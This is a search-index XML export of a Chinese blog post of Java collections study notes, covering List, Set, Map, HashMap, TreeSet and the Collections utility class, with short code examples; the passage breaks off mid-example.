<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java 基础(2)</title>
    <link href="/2024/11/09/Java2/"/>
    <url>/2024/11/09/Java2/</url>
    
    <content type="html"><![CDATA[<h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="集合框架体系"><a href="#集合框架体系" class="headerlink" title="集合框架体系"></a>集合框架体系</h2><ul><li>主要是两组 Collection 和 Map （单列集合，双列集合）</li><li>Collection 接口有两个子接口 List、Set，其实现子类都是单列集合</li><li>Map 接口的实现子类是双列集合，存放的 K-V</li></ul><h2 id="Collection-接口"><a href="#Collection-接口" class="headerlink" title="Collection 接口"></a>Collection 接口</h2><ul><li><p>add 添加单个元素，都是Object ，基本数据类型加入的是包装类型</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Collection <span class="hljs-attribute">collection</span>=new ArrayList();<br>  collection.<span class="hljs-built_in">add</span>(100);<br>  collection.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;java&quot;</span>);<br>  collection.<span class="hljs-built_in">add</span>(<span class="hljs-literal">false</span>);<br>  collection.<span class="hljs-built_in">add</span>(<span class="hljs-literal">null</span>);<br>  System.out.println(collection);<br></code></pre></td></tr></table></figure></li><li><p>remove 删除指定元素，List 的子类有重载，可以按 index 删除</p></li><li><p>contains 查找元素是否存在</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery">collection<span class="hljs-built_in">.contains</span><span class="hljs-built_in">(false</span>);<br>   System.out.println<span class="hljs-built_in">(collection</span><span class="hljs-built_in">.contains</span><span class="hljs-built_in">(false</span>));<br></code></pre></td></tr></table></figure></li><li><p>size 获取元素个数</p></li><li><p>isEmpty 判断是否为空</p></li><li><p>clear 清空</p></li><li><p>addAll 查找多个元素是否存在</p></li><li><p>removeAll 删除多个元素</p></li></ul><h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><ul><li>有序，可重复</li><li>void add ( int index,Object ele ) 在 index 位置插入 ele 元素</li><li>boolean addAll ( int index,Collection eles) 从 index 位置开始将 eles 中的所有元素添加进来</li><li>Object get ( int index) 获取指定 index 位置的元素</li><li>int indexOf（Object obj)返回 obj 在当前集合中最后一次出现的位置</li><li>Object remove ( int index) 移除指定 index 位置的元素，并返回此元素</li><li>Object set （ int index,Object ele )  设置指定 index 位置的元素为 ele，相当于替换</li><li>List sublist ( int fromIndex,int toIndex)  返回从 fromIndex 到 toIndex 位置的子集合</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs csharp">List list =<span class="hljs-keyword">new</span> ArrayList();<br>   list.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;javass&quot;</span>);<br>   list.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;urm&quot;</span>);<br>   list.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;rr&quot;</span>);<br>   list.<span class="hljs-keyword">add</span>(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;java&quot;</span>);<br>       <br>   List list2=<span class="hljs-keyword">new</span> ArrayList();<br>   list2.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;javass2&quot;</span>);<br>   list2.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;urm2&quot;</span>);<br>   list2.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;rr2&quot;</span>);<br>   list.addAll(<span class="hljs-number">1</span>,list2);<br>   list.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;urm2&quot;</span>);<br>   list.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;urm&quot;</span>);<br>       <br>   System.<span class="hljs-keyword">out</span>.println(list.<span class="hljs-keyword">get</span>(<span class="hljs-number">4</span>));    <span class="hljs-comment">//urm</span><br>       <br>   System.<span class="hljs-keyword">out</span>.println(list.indexOf(<span class="hljs-string">&quot;urm2&quot;</span>));       <span class="hljs-comment">//2</span><br>       <br>   System.<span class="hljs-keyword">out</span>.println(list.lastIndexOf(<span class="hljs-string">&quot;urm&quot;</span>));        <span class="hljs-comment">//8</span><br>   list.<span class="hljs-keyword">remove</span>(<span class="hljs-number">8</span>);<br>   list.<span class="hljs-keyword">set</span>(<span class="hljs-number">7</span>,<span class="hljs-string">&quot;urm4&quot;</span>);<br>   System.<span class="hljs-keyword">out</span>.println(list.subList(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>));      <span class="hljs-comment">//[javass2, urm2, rr2]</span><br>   System.<span class="hljs-keyword">out</span>.println(list);   <span class="hljs-comment">//[javass, javass2, urm2, rr2, urm, java, rr, urm4]</span><br></code></pre></td></tr></table></figure><h2 id="List-遍历"><a href="#List-遍历" class="headerlink" title="List 遍历"></a>List 遍历</h2><ul><li>适用于所有实现子类</li></ul><p>迭代器遍历</p><ul><li><p>Iterator 对象为迭代器，用于遍历 Collection 集合的元素</p></li><li><p>实现 Collection 接口的集合类都有 iterator( ) 方法，返回一个迭代器</p></li><li><p>Iterator 结构</p></li><li><p>Iterator 仅用于遍历集合，Iterator 本身并不存放对象</p></li><li><p>快捷输入 itit</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gradle">Iterator iterator=list.iterator();<br>    Object <span class="hljs-keyword">next</span>=iterator.<span class="hljs-keyword">next</span>();<br>    System.out.<span class="hljs-keyword">println</span>(<span class="hljs-keyword">next</span>);       <span class="hljs-comment">//javass</span><br>        <br>    Object next2=iterator.<span class="hljs-keyword">next</span>();<br>    System.out.<span class="hljs-keyword">println</span>(next2);          <span class="hljs-comment">//javass2</span><br>        <br>    System.out.<span class="hljs-keyword">println</span>(list);   <span class="hljs-comment">//[javass, javass2, urm2, rr2, urm, java, rr, urm2, urm]</span><br><span class="hljs-comment">//相当于指针</span><br></code></pre></td></tr></table></figure></li></ul><p>增强 for 循环</p><ul><li>实际上还是迭代器遍历</li><li>快捷输入 iter&#x2F;xxx.for</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">Object</span> o : list) &#123;<br>   <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(o);<br>&#125;<br>        <br>//javass<br>javass2<br>urm2<br>rr2<br>urm<br>java<br>rr<br>urm2<br>urm<br></code></pre></td></tr></table></figure><p>for 循环</p><ul><li>xxx.for</li><li>前提有索引</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i=<span class="hljs-number">0</span>;i&lt;list.size();i++)&#123;<br>    System.<span class="hljs-keyword">out</span>.println(list.<span class="hljs-keyword">get</span>(i));<br>&#125;<br><span class="hljs-comment">//有索引</span><br></code></pre></td></tr></table></figure><h2 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h2><ul><li>由数组实现数据存储</li><li>Vector 和 ArrayList 基本相同，Vector 线程安全，ArrayList 执行效率高</li></ul><p>ArrayList 扩容机制</p><ul><li>有一个 Object 类型的数组 elementData，存放元素 transient Object [ ] elementData</li><li>指定大小构造器</li></ul><h2 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h2><ul><li>对象数组存放元素，protected Object [ ]  elementData</li><li>指定扩容个数        new Vector(10,3)</li></ul><h2 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h2><ul><li>双向链表，有两个属性 first 和 last 分别指向首节点和尾节点</li><li>每个节点（Node 对象）里面有 prev 、next、item三个属性，item 存放元素，prev 指向前一个节点，next 指向后一个节点</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">   Node java= <span class="hljs-built_in">new</span> Node(&quot;java&quot;);<br>       Node rw=<span class="hljs-built_in">new</span> Node(&quot;rw&quot;);<br>       Node urm=<span class="hljs-built_in">new</span> Node(&quot;urm&quot;);<br>       java.next=rw;<br>       rw.next=urm;<br>       <br>       urm.prev=rw;<br>       rw.prev=java;<br>       <br>       Node first=java;<br>       Node last=urm;<br>       <br>       Node <span class="hljs-keyword">temp</span>=first;<br>       <span class="hljs-keyword">while</span>(<span class="hljs-keyword">temp</span>!=<span class="hljs-keyword">null</span>)&#123;<br>           <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">temp</span>);<br>           <span class="hljs-keyword">temp</span>=<span class="hljs-keyword">temp</span>.next;<br>       &#125;<br>        <br>        <span class="hljs-keyword">temp</span>=last;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-keyword">temp</span>!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">temp</span>);<br>            <span class="hljs-keyword">temp</span>=<span class="hljs-keyword">temp</span>.prev;<br>        &#125;<br>    <br>    &#125;<br>   <br>&#125;<br><span class="hljs-keyword">class</span> Node&#123;<br>    <span class="hljs-built_in">public</span> Node prev;<br>    <span class="hljs-built_in">public</span> Node next;<br>    <span class="hljs-built_in">public</span> <span class="hljs-keyword">Object</span> item;<br>    <br>    <span class="hljs-built_in">public</span> Node(<span class="hljs-keyword">Object</span> item) &#123;<br>        this.item = item;<br>    &#125;<br>    <br>    @Override<br>    <span class="hljs-built_in">public</span> String toString() &#123;<br>        <span class="hljs-keyword">return</span> &quot;Node&#123;&quot; +<br>                &quot;item=&quot; + item +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br>//Node&#123;item=java&#125;<br>Node&#123;item=rw&#125;<br>Node&#123;item=urm&#125;<br>Node&#123;item=urm&#125;<br>Node&#123;item=rw&#125;<br>Node&#123;item=java&#125;<br></code></pre></td></tr></table></figure><h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><ul><li><p>无序，没有索引，但是输出顺序固定</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs csharp">HashSet hashSet=<span class="hljs-keyword">new</span> HashSet();<br>    hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;java&quot;</span>);<br>    hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;abc&quot;</span>);<br>    hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;def&quot;</span>);<br>    hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;javsdv&quot;</span>);<br>    hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;rw&quot;</span>);<br>    System.<span class="hljs-keyword">out</span>.println(hashSet);<br><span class="hljs-comment">//[java, abc, def, rw, javsdv]</span><br></code></pre></td></tr></table></figure></li><li><p>不允许重复元素，最多包含一个 null</p></li><li><p>Set 接口是 Collection 子接口，常用方法和 Collection 一样</p></li><li><p>Set 接口遍历方式</p><ul><li>迭代器遍历</li><li>增强 for 遍历</li><li>不能用索引来获取，无法使用普通 for 遍历</li></ul></li></ul><h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><ul><li><p>实际上是 HashMap</p></li><li><p>无序，取决于 hash 后，确定索引结果</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"> HashSet <span class="hljs-keyword">set</span>=<span class="hljs-built_in">new</span> HashSet();<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">set</span>.<span class="hljs-keyword">add</span>(&quot;java&quot;));<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">set</span>.<span class="hljs-keyword">add</span>(&quot;abc&quot;));<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">set</span>.<span class="hljs-keyword">add</span>(&quot;def&quot;));<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">set</span>.<span class="hljs-keyword">add</span>(&quot;java&quot;));<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">set</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">null</span>));<br>    <span class="hljs-keyword">set</span>.remove(&quot;def&quot;);<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;set&quot;+<span class="hljs-keyword">set</span>);<br>//<span class="hljs-keyword">true</span><br><span class="hljs-keyword">true</span><br><span class="hljs-keyword">true</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">true</span><br><span class="hljs-keyword">set</span>[<span class="hljs-keyword">null</span>, java, abc]<br></code></pre></td></tr></table></figure></li></ul><p><strong>add 进行的操作</strong></p><ul><li>HashMap 底层是（数组 + 链表 + 红黑树）</li><li>添加一个元素时，先得到 hash 值，然后转化为索引值</li><li>找到存储数据表 table ，看这个索引位置是否已经存放元素，没有就直接加入，有就调用 equals 比较，相同就放弃添加，不同就添加到最后</li><li>如果一条链表元素个数&gt;&#x3D;8,table &gt;&#x3D;64，进行树华</li><li>如果链表没达到 8 ，table 没到 64，先进行数组扩容</li><li>加入 HashMap 中的元素，是否相同由 HashCode 和 equals 方法决定</li></ul><h2 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h2><ul><li>不允许添加重复元素，是HashSet子类，底层是 LinkedHashMap</li><li>遍历顺序和添加顺序一致</li><li>存放元素方式和 HashSet 相同，在此基础上又维护了一个双向链表</li></ul><h2 id="Map-接口"><a href="#Map-接口" class="headerlink" title="Map 接口"></a>Map 接口</h2><ul><li>与 Collection 并列存在。用于保存具有映射关系的数据：Key - Value （双列集合）</li><li>key 和 value 可以是任何引用数据类型，会封装到 HashMap$Node 对象中</li><li>key 不能重复，key 一样时，新的值会替换旧的，value可以重复</li><li>key 可以为 null （只能一个），value 可以为 null (可以多个)</li><li>key 和 value 为单向一对一关系，通过指定 key 可以找到对应的 value</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">  Map hashMap=<span class="hljs-built_in">new</span> HashMap();<br>    hashMap.put(&quot;user&quot;,&quot;bb&quot;);<br>    hashMap.put(&quot;pass&quot;,&quot;word&quot;);<br>    <span class="hljs-type">Integer</span> <span class="hljs-type">integer</span>=<span class="hljs-built_in">new</span> <span class="hljs-type">Integer</span>(<span class="hljs-number">100</span>);<br>    hashMap.put(<span class="hljs-type">integer</span>,<span class="hljs-keyword">null</span>);<br>        <br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(hashMap);<br>//&#123;<span class="hljs-number">100</span>=<span class="hljs-keyword">null</span>, pass=word, <span class="hljs-keyword">user</span>=bb&#125;<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Map hashMap=<span class="hljs-built_in">new</span> HashMap();<br>    hashMap.put(&quot;user&quot;,&quot;bb&quot;);<br>    hashMap.put(&quot;pass&quot;,&quot;word&quot;);<br>    hashMap.put(&quot;admin&quot;,&quot;me&quot;);<br>    <span class="hljs-type">Integer</span> <span class="hljs-type">integer</span>=<span class="hljs-built_in">new</span> <span class="hljs-type">Integer</span>(<span class="hljs-number">100</span>);<br>    hashMap.put(<span class="hljs-type">integer</span>,<span class="hljs-keyword">null</span>);<br>    hashMap.remove(&quot;user&quot;);<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(hashMap.<span class="hljs-keyword">get</span>(&quot;pass&quot;));<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(hashMap.size());<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(hashMap.isEmpty());<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(hashMap.containsKey(&quot;admin&quot;));<br>    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(hashMap);<br>//word<br><span class="hljs-number">3</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">true</span><br>&#123;<span class="hljs-number">100</span>=<span class="hljs-keyword">null</span>, pass=word, <span class="hljs-keyword">admin</span>=me&#125;<br></code></pre></td></tr></table></figure><h2 id="HashMap-遍历"><a href="#HashMap-遍历" class="headerlink" title="HashMap 遍历"></a>HashMap 遍历</h2><ul><li><p>取出所有的 Key ，通过 key 获取 value</p><ul><li><p>加强 for循环</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">Set</span> <span class="hljs-attribute">keyset</span>=hashMap.keySet();<br><span class="hljs-keyword">for</span>(Object key:keyset)&#123;<br>    System.out.println(key+<span class="hljs-string">&quot;-&quot;</span>+hashMap.<span class="hljs-built_in">get</span>(key));<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>迭代器遍历</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-type">Iterator</span> <span class="hljs-keyword">iterator</span>=<span class="hljs-type">set</span>.<span class="hljs-keyword">iterator</span>();<br><span class="hljs-keyword">while</span>(<span class="hljs-keyword">iterator</span>.hasNext())&#123;<br><span class="hljs-type">Object</span> keyset=<span class="hljs-keyword">iterator</span>.next();<br><span class="hljs-type">System</span>.<span class="hljs-keyword">out</span>.println(keyset+<span class="hljs-string">&quot;-&quot;</span>+hashMap.get(keyset));<br>&#125;<br></code></pre></td></tr></table></figure><p>- </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"> <span class="hljs-keyword">Set</span> keysset =hashMap.keySet();<br> keysset.<span class="hljs-keyword">forEach</span>(<span class="hljs-built_in">new</span> Consumer() &#123;<br>      @Override<br>      <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> accept(<span class="hljs-keyword">Object</span> keyset) &#123;<br>         <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(keyset+&quot;-&quot;+hashMap.<span class="hljs-keyword">get</span>(keyset));<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure></li></ul></li><li><p>取出所有的 value</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Collection <span class="hljs-keyword">values</span>=hashMap.<span class="hljs-keyword">values</span>();<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">Object</span> <span class="hljs-keyword">value</span>:<span class="hljs-keyword">values</span>)&#123;<br>      <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">value</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>通过 EntrySet 来获取 K-V</p><p>- </p>  <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">Set entrySet=hashMap.entrySet();<br> <span class="hljs-keyword">for</span> (Object keyset:entrySet)&#123;<br> Map.<span class="hljs-keyword">Entry</span> <span class="hljs-keyword">entry</span>=(Map.<span class="hljs-keyword">Entry</span>)keyset;<br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">entry</span>.getKey()+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-keyword">entry</span>.getValue());<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>Key-Value 存放</p></li><li><p>keySet 和 values 返回类型</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Set</span> <span class="hljs-keyword">set</span>=map.keySet();<br><span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">set</span>.getClass());<br>Collection <span class="hljs-keyword">values</span>=map.<span class="hljs-keyword">values</span>();<br><span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">values</span>.getClass());<br></code></pre></td></tr></table></figure></li></ul><h2 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h2><ul><li>存放键值对：K-V</li><li>键值不能为 null</li><li>使用方法和 HashMap 差不多一样</li></ul><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><ul><li>继承自 Hashtable 类</li><li>用法和 hashmap 一样，键值不能为 null</li></ul><h2 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h2><ul><li><p>如果比较结果器为 0 ，数据不会加入到 TreeSet</p></li><li><p>在构造器中，可以传入一个比较器，指定排序规则</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">TreeSet treeSet=<span class="hljs-built_in">new</span> TreeSet(<span class="hljs-built_in">new</span> Comparator() &#123;<br>       @Override<br>       <span class="hljs-built_in">public</span> <span class="hljs-type">int</span> compare(<span class="hljs-keyword">Object</span> o1, <span class="hljs-keyword">Object</span> o2) &#123;<br>            <span class="hljs-keyword">return</span> ((String)o2).compareTo((String)o1);<br>       &#125;<br>   &#125;);<br>   treeSet.<span class="hljs-keyword">add</span>(&quot;abcd&quot;);<br>   treeSet.<span class="hljs-keyword">add</span>(&quot;abc&quot;);<br>   treeSet.<span class="hljs-keyword">add</span>(&quot;abd&quot;);<br>   treeSet.<span class="hljs-keyword">add</span>(&quot;cbd&quot;);<br>   treeSet.<span class="hljs-keyword">add</span>(&quot;ebd&quot;);<br>        <br>   <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(treeSet);<br>//[ebd, cbd, abd, abcd, abc]        <br></code></pre></td></tr></table></figure></li></ul><h2 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h2><ul><li>可以传入一个比较器，指定排序规则</li><li>如果比较器返回 0 ，则 key 不会加入到 TreeMap，值会替换</li></ul><h2 id="Collections-工具类"><a href="#Collections-工具类" class="headerlink" title="Collections 工具类"></a>Collections 工具类</h2><ul><li>是一个操作 Set、List 和 Map等集合的工具类，提供一系列静态方法</li></ul><h3 id="排序相关"><a href="#排序相关" class="headerlink" title="排序相关"></a>排序相关</h3><ul><li>reverse ( List ):反转 List 元素的顺序</li><li>shuffle ( List ) : 随机打乱</li><li>sort ( List ) : 按升序排序</li><li>sort (List,Comparator ) : 制定规则进行排序</li><li>swap ( List，int i，int  j ) : 将 i 和 j 处元素进行交换</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">ArrayList <span class="hljs-built_in">array</span>List=new ArrayList();<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">200</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">300</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">400</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">500</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">600</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">700</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">800</span>);<br>    <span class="hljs-built_in">array</span>List.add(<span class="hljs-number">900</span>);<br>    System.<span class="hljs-keyword">out</span>.println(<span class="hljs-built_in">array</span>List);  <span class="hljs-comment">//[100, 200, 300, 400, 500, 600, 700, 800, 900]</span><br>     <br><span class="hljs-comment">//reverse(List):对 List 元素进行反转</span><br>    Collections.reverse(<span class="hljs-built_in">array</span>List);<br>    System.<span class="hljs-keyword">out</span>.println(<span class="hljs-built_in">array</span>List);      <span class="hljs-comment">//[900, 800, 700, 600, 500, 400, 300, 200, 100]</span><br>        <br><span class="hljs-comment">//shuffle(List):对 List 集合元素进行随机打乱</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>        Collections.shuffle(<span class="hljs-built_in">array</span>List);<br>          System.<span class="hljs-keyword">out</span>.println(<span class="hljs-built_in">array</span>List);<br>    &#125;<br>        <br><span class="hljs-comment">//sort(List):按升序排序</span><br>   Collections.sort(<span class="hljs-built_in">array</span>List);<br>      System.<span class="hljs-keyword">out</span>.println(<span class="hljs-built_in">array</span>List);  <span class="hljs-comment">//[100, 200, 300, 400, 500, 600, 700, 800, 900]</span><br>        <br><span class="hljs-comment">//swap(List,int,int):将指定 List 集合的 i 处元素和 j 处元素交换</span><br>   